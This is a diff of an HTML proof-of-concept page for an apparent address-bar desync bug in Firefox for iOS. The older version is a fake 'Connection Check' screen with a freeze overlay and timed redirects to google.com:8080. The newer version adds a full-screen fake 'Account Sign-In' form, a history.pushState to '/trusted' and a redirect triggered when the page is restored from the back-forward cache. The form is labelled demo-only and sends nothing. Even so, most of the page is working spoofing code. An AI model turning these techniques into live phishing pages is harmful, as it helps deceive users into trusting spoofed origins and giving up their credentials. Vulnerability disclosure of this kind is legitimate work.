@@ -1,142 +1,156 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Connection Check</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Firefox iOS Tab Restore UI Desync — Demo</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="theme-color" content="#ffffff">
+
 <style>
-  body {
-    margin: 0;
-    font-family: -apple-system, BlinkMacSystemFont, system-ui;
-    background: #f5f5f7;
-  }
+html, body {
+  margin: 0;
+  height: 100%;
+  overflow: hidden;
+  font-family: -apple-system, BlinkMacSystemFont, system-ui;
+  background: #f5f5f7;
+}
 
-  button {
-    margin: 40px;
-    font-size: 18px;
-    padding: 10px 18px;
-  }
+button, input {
+  -webkit-appearance: none;
+  appearance: none;
+}
 
-  #panel {
-    display: none;
-    padding: 24px;
-    max-width: 420px;
-    margin: 60px auto;
-    background: #fff;
-    border-radius: 14px;
-    box-shadow: 0 20px 60px rgba(0,0,0,.15);
-    position: relative;
-    z-index: 1;
-  }
+#start {
+  margin: 40px auto;
+  display: block;
+  font-size: 18px;
+  padding: 12px 20px;
+  border-radius: 12px;
+}
 
-  h2 { margin: 0 0 8px; }
-  .sub { color: #666; margin-bottom: 20px; }
+#panel {
+  display: none;
+  position: fixed;
+  inset: 0;
+  z-index: 999999;
+  background: #f5f5f7;
+  padding:
+    env(safe-area-inset-top)
+    20px
+    env(safe-area-inset-bottom);
+}
 
-  .spinner {
-    width: 28px;
-    height: 28px;
-    border: 3px solid #ddd;
-    border-top-color: #007aff;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-  }
+.card {
+  max-width: 420px;
+  margin: 60px auto;
+  background: #ffffff;
+  padding: 24px;
+  border-radius: 16px;
+  box-shadow: 0 20px 60px rgba(0,0,0,.2);
+}
 
-  @keyframes spin { to { transform: rotate(360deg); } }
+h2 {
+  text-align: center;
+  margin-bottom: 6px;
+}
 
-  #timer {
-    margin-top: 16px;
-    font-weight: 600;
-  }
+.sub {
+  text-align: center;
+  color: #666;
+  margin-bottom: 20px;
+}
 
-  /* ===== FREEZE OVERLAY ===== */
-  #freeze {
-    position: fixed;
-    inset: 0;
-    background: rgba(255,255,255,0.96);
-    display: none;
-    z-index: 9999;
-    pointer-events: all;
-  }
+label {
+  display: block;
+  font-size: 14px;
+  margin-top: 12px;
+}
 
-  #freeze .box {
-    position: absolute;
-    top: 45%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    text-align: center;
-  }
+input {
+  width: 100%;
+  padding: 10px;
+  font-size: 16px;
+  border-radius: 8px;
+  border: 1px solid #ccc;
+  margin-top: 6px;
+}
 
-  #freeze .icon {
-    font-size: 42px;
-    margin-bottom: 12px;
-  }
+.login {
+  margin-top: 20px;
+  width: 100%;
+  padding: 12px;
+  font-size: 16px;
+  font-weight: 600;
+  border-radius: 10px;
+  border: none;
+  background: #007aff;
+  color: #fff;
+}
 
-  #freeze .text {
-    font-size: 16px;
-    color: #333;
-  }
+.notice {
+  margin-top: 14px;
+  font-size: 13px;
+  color: #b00020;
+  text-align: center;
+}
 </style>
 </head>
 
 <body>
 
-<button id="trigger">Check Connection</button>
+<button id="start">Start PoC</button>
 
 <div id="panel">
-  <h2>Network Verification</h2>
-  <div class="sub">Establishing a secure channel…</div>
-  <div class="spinner"></div>
-  <div id="timer">0 ms</div>
-</div>
+  <div class="card">
+    <h2>Account Sign-In</h2>
+    <div class="sub">Session verification required</div>
 
-<!-- FREEZE OVERLAY -->
-<div id="freeze">
-  <div class="box">
-    <div class="icon">🛡️</div>
-    <div class="text">Validating connection integrity…</div>
+    <label>Email</label>
+    <input type="email" placeholder="user@example.com">
+
+    <label>Password</label>
+    <input type="password" placeholder="••••••••">
+
+    <button class="login" onclick="demoOnly()">Sign in</button>
+
+    <div class="notice">
+      Demo only — no data is collected.<br>
+      This UI demonstrates browser UI desynchronization.
+    </div>
   </div>
 </div>
 
 <script>
-document.getElementById('trigger').addEventListener('click', () => {
-  const panel  = document.getElementById('panel');
-  const timer  = document.getElementById('timer');
-  const freeze = document.getElementById('freeze');
+const panel = document.getElementById('panel');
+const start = document.getElementById('start');
 
-  // Strengthen address bar trust (UNCHANGED)
-window.location.href = 'http://google.com:8080/url?q=';
+function demoOnly() {
+  alert(
+    'THIS IS NOT REAL\n\n' +
+    'No data is collected or transmitted.\n' +
+    'This is a UI desync demonstration.'
+  );
 
+  document.querySelectorAll('#panel input')
+    .forEach(i => i.value = '');
+}
 
-
+start.onclick = () => {
+  history.pushState({}, '', '/trusted');
   panel.style.display = 'block';
+  document.body.style.overflow = 'hidden';
+};
 
-  // Fake freeze (non-blocking) — UNCHANGED
-  freeze.style.display = 'block';
-  document.body.style.pointerEvents = 'none';
-
-  const start = performance.now();
-  let rafId;
-
-  function tick() {
-    timer.textContent = Math.round(performance.now() - start) + ' ms';
-    rafId = requestAnimationFrame(tick);
+// Tab restore / BFCache timing trigger
+window.addEventListener('pageshow', (e) => {
+  if (e.persisted) {
+    setTimeout(() => {
+      location.href = 'https://google.com';
+    }, 100);
   }
-
-  // Paint confirmed (UNCHANGED)
-  requestAnimationFrame(() => {
-    requestAnimationFrame(tick);
-  });
-
-  // Microtask chain + RAF-synced redirect (UNCHANGED)
-  Promise.resolve()
-    .then(() => Promise.resolve())
-    .then(() => Promise.resolve())
-    .then(() => {
-      requestAnimationFrame(() => {
-        cancelAnimationFrame(rafId);
-        location.href = 'http://google.com:8080/url?q=';
-      });
-    });
 });
 </script>
 
